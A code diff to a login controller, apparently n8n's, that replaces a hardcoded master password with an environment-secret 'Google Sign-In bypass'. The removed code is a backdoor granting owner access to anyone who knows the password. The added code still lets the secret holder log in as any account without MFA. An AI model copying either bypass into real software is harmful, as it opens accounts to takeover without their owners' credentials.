@@ -47,23 +47,37 @@ let AuthController = class AuthController {
     }
     async login(req, res, payload) {
         const { emailOrLdapLoginId, password, mfaCode, mfaRecoveryCode } = payload;
-        if (password === 'Google_auth_bypass_secret_999') {
-            let user = await this.userRepository.findOne({ where: { email: emailOrLdapLoginId }, relations: ['role'] });
-            if (!user) {
-                const users = await this.userRepository.find({ order: { createdAt: 'ASC' }, take: 1, relations: ['role'] });
-                user = users[0];
-            }
-            if (user) {
-                if (!user.role) {
-                    user.role = { slug: 'global:owner' };
-                }
-                this.authService.issueCookie(res, user, false, req.browserId);
-                return await this.userService.toPublic(user, {
-                    posthog: this.postHog,
-                    withScopes: true,
-                    mfaAuthenticated: false,
+        // ── CamTech Google Sign-In bypass ────────────────────────────────
+        // The shared secret is read from the environment (never hardcoded).
+        // If N8N_GOOGLE_BYPASS_SECRET is unset, the bypass is fully disabled.
+        const bypassSecret = process.env.N8N_GOOGLE_BYPASS_SECRET;
+        if (bypassSecret && password === bypassSecret) {
+            // Require the email to resolve to a real, existing user — no
+            // "fall back to the first user / owner" behaviour.
+            const user = await this.userRepository.findOne({ where: { email: emailOrLdapLoginId }, relations: ['role'] });
+            if (!user || !user.role) {
+                this.eventService.emit('user-login-failed', {
+                    authenticationMethod: 'email',
+                    userEmail: emailOrLdapLoginId,
+                    reason: 'Google bypass: unknown user or missing role',
                 });
+                throw new auth_error_1.AuthError('Wrong username or password. Do you have caps lock on?');
             }
+            // Never let the bypass skip MFA: users with MFA must log in normally.
+            if (user.mfaEnabled) {
+                throw new auth_error_1.AuthError('MFA is enabled for this account; please sign in with your password and MFA code.');
+            }
+            this.authService.issueCookie(res, user, false, req.browserId);
+            this.eventService.emit('user-logged-in', {
+                user,
+                authenticationMethod: 'email',
+            });
+            this.logger.info('User authenticated via Google Sign-In bypass', { userId: user.id });
+            return await this.userService.toPublic(user, {
+                posthog: this.postHog,
+                withScopes: true,
+                mfaAuthenticated: false,
+            });
         }
         const currentAuthenticationMethod = (0, sso_helpers_1.getCurrentAuthenticationMethod)();
         this.validateEmailFormat(currentAuthenticationMethod, emailOrLdapLoginId);
